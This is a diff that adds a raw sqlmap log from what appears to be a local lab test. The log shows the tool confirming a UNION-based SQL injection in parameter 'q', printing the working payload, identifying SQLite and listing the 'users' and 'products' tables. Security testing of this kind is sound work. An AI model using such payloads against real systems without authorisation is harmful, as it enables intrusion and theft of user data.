@@ -1,0 +1,54 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.9#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:00:34 /2026-09-28/
+
+[21:00:34] [WARNING] using '/private/tmp/sqlmap_lab_out' as the output directory
+[21:00:34] [INFO] testing connection to the target URL
+[21:00:34] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:00:34] [INFO] testing if the target URL content is stable
+[21:00:35] [INFO] target URL content is stable
+[21:00:35] [INFO] testing if GET parameter 'q' is dynamic
+[21:00:35] [INFO] GET parameter 'q' appears to be dynamic
+[21:00:35] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be SQL injectable
+[21:00:35] [INFO] testing for SQL injection on GET parameter 'q'
+[21:00:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:00:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[21:00:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[21:00:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:00:35] [INFO] target URL appears to have 4 columns in query
+[21:00:35] [WARNING] reflective value(s) found and filtering out
+[21:00:35] [INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+[21:00:35] [INFO] checking if the injection point on GET parameter 'q' is a false positive
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 30 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: q=clean' UNION ALL SELECT NULL,NULL,NULL,CHAR(113,98,112,122,113)||CHAR(102,107,121,105,83,118,117,69,86,69,122,66,79,67,67,101,104,89,86,102,70,74,70,99,90,102,112,109,69,109,112,85,89,103,75,116,118,67,83,101)||CHAR(113,122,122,122,113)-- RigV
+---
+[21:00:35] [INFO] testing SQLite
+[21:00:35] [INFO] confirming SQLite
+[21:00:35] [INFO] actively fingerprinting SQLite
+[21:00:35] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[21:00:35] [INFO] fetching tables for database: 'SQLite_masterdb'
+<current>
+[2 tables]
++----------+
+| products |
+| users    |
++----------+
+
+[21:00:35] [INFO] fetched data logged to text files under '/private/tmp/sqlmap_lab_out/localhost'
+
+[*] ending @ 21:00:35 /2026-09-28/
+
